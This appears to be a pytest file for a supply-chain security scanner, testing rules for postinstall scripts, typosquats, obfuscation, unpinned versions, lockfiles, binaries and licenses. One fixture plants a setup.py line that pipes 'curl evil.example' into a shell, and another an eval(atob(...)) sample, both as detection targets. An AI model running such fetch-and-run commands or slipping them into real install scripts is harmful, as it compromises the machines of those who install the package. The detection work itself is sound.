"""Supply-chain rule tests."""

from __future__ import annotations

import json
from pathlib import Path

from mception.rules.supply_chain import (
    DependencySummary,
    parse_manifests,
    rule_missing_license,
    rule_no_lockfile,
    rule_obfuscation,
    rule_postinstall_scripts,
    rule_setuppy_sideeffects,
    rule_suspicious_binaries,
    rule_typosquat,
    rule_unpinned_versions,
)


def test_parse_manifests_package_json(tmp_path: Path):
    (tmp_path / "package.json").write_text(
        json.dumps({"dependencies": {"axios": "^1.6.0", "zod": "~3.22"}}), encoding="utf-8"
    )
    deps, info = parse_manifests(tmp_path)
    names = {d.name for d in deps}
    assert names == {"axios", "zod"}
    assert "package_json" in info


def test_parse_requirements_txt(tmp_path: Path):
    (tmp_path / "requirements.txt").write_text("httpx==0.27.0\npydantic>=2.6\n", encoding="utf-8")
    deps, _ = parse_manifests(tmp_path)
    names = {d.name for d in deps}
    assert "httpx" in names and "pydantic" in names


def test_postinstall_script_flagged(tmp_path: Path):
    (tmp_path / "package.json").write_text(
        json.dumps({"scripts": {"postinstall": "node setup.js"}}), encoding="utf-8"
    )
    _, info = parse_manifests(tmp_path)
    r = list(rule_postinstall_scripts(tmp_path, info))
    assert r and r[0].rule_id == "MCP-SUP-001"


def test_setuppy_subprocess_flagged(tmp_path: Path):
    (tmp_path / "setup.py").write_text(
        "import os\nos.system('curl evil.example | sh')\nfrom setuptools import setup\nsetup()\n",
        encoding="utf-8",
    )
    r = list(rule_setuppy_sideeffects(tmp_path))
    assert r and r[0].rule_id == "MCP-SUP-004"


def test_typosquat_detected():
    deps = [DependencySummary(name="requessts", version="1.0", ecosystem="pypi")]
    r = list(rule_typosquat(deps))
    assert r and r[0].rule_id == "MCP-SUP-002"
    assert "requests" in r[0].description


def test_typosquat_real_name_ignored():
    deps = [DependencySummary(name="httpx", version="0.27", ecosystem="pypi")]
    r = list(rule_typosquat(deps))
    assert r == []


def test_typosquat_popular_npm_packages_not_flagged():
    """Regression for the azure-devops audit: jest was flagged as typosquat of next."""
    for name in ("jest", "mocha", "vitest", "webpack", "rollup", "next", "nuxt",
                 "react-dom", "vue", "svelte", "fastify", "redux", "zustand", "bcrypt"):
        deps = [DependencySummary(name=name, version="1.0.0", ecosystem="npm")]
        assert list(rule_typosquat(deps)) == [], f"{name} incorrectly flagged as typosquat"


def test_typosquat_still_catches_real_near_miss():
    # These should still trigger — they're off-by-one/two from legitimate packages
    # and not in the reference set.
    for bad in ("axois", "expres", "reacct", "jezt"):
        deps = [DependencySummary(name=bad, version="1.0.0", ecosystem="npm")]
        r = list(rule_typosquat(deps))
        assert r, f"{bad} should still be flagged as typosquat"


def test_obfuscation_packed_eval(tmp_path: Path):
    (tmp_path / "x.js").write_text(
        "const data='" + ("A" * 300) + "'; eval(atob(data));\n", encoding="utf-8"
    )
    r = list(rule_obfuscation(tmp_path))
    assert any(f.rule_id == "MCP-SUP-003" for f in r)


def test_unpinned_npm_caret():
    deps = [DependencySummary(name="axios", version="^1.6.0", ecosystem="npm")]
    r = list(rule_unpinned_versions(deps, {}))
    assert r and r[0].rule_id == "MCP-SUP-005"


def test_unpinned_pypi_range():
    deps = [DependencySummary(name="pydantic", version=">=2.6", ecosystem="pypi")]
    r = list(rule_unpinned_versions(deps, {}))
    assert r and "pydantic" in r[0].evidence[0].extra["unpinned"][0][0]


def test_pinned_exact_not_flagged():
    deps = [
        DependencySummary(name="pydantic", version="==2.6.0", ecosystem="pypi"),
        DependencySummary(name="axios", version="1.6.0", ecosystem="npm"),
    ]
    r = list(rule_unpinned_versions(deps, {}))
    assert r == []


def test_missing_npm_lockfile_flagged(tmp_path: Path):
    (tmp_path / "package.json").write_text(
        json.dumps({"dependencies": {"axios": "1.6.0"}}), encoding="utf-8"
    )
    deps = [DependencySummary(name="axios", version="1.6.0", ecosystem="npm")]
    r = list(rule_no_lockfile(tmp_path, deps))
    assert r and r[0].rule_id == "MCP-SUP-006"


def test_npm_lockfile_present_suppresses(tmp_path: Path):
    (tmp_path / "package.json").write_text(
        json.dumps({"dependencies": {"axios": "1.6.0"}}), encoding="utf-8"
    )
    (tmp_path / "package-lock.json").write_text("{}", encoding="utf-8")
    deps = [DependencySummary(name="axios", version="1.6.0", ecosystem="npm")]
    assert list(rule_no_lockfile(tmp_path, deps)) == []


def test_pip_hashed_requirements_suppresses(tmp_path: Path):
    (tmp_path / "requirements.txt").write_text(
        "httpx==0.27.0 --hash=sha256:deadbeef\n", encoding="utf-8"
    )
    deps = [DependencySummary(name="httpx", version="0.27.0", ecosystem="pypi")]
    assert list(rule_no_lockfile(tmp_path, deps)) == []


def test_suspicious_binary_flagged(tmp_path: Path):
    (tmp_path / "helper.dll").write_bytes(b"\x00" * 1024)
    r = list(rule_suspicious_binaries(tmp_path))
    assert r and r[0].rule_id == "MCP-SUP-007"


def test_suspicious_binary_ignored_in_node_modules(tmp_path: Path):
    (tmp_path / "node_modules").mkdir()
    (tmp_path / "node_modules" / "inner.dll").write_bytes(b"\x00" * 100)
    assert list(rule_suspicious_binaries(tmp_path)) == []


def test_missing_license_flagged(tmp_path: Path):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "x", "version": "1.0.0"}), encoding="utf-8"
    )
    _, info = parse_manifests(tmp_path)
    r = list(rule_missing_license(info, tmp_path))
    assert r and r[0].rule_id == "MCP-PROV-001"


def test_license_file_suppresses(tmp_path: Path):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "x"}), encoding="utf-8"
    )
    (tmp_path / "LICENSE").write_text("MIT", encoding="utf-8")
    _, info = parse_manifests(tmp_path)
    assert list(rule_missing_license(info, tmp_path)) == []
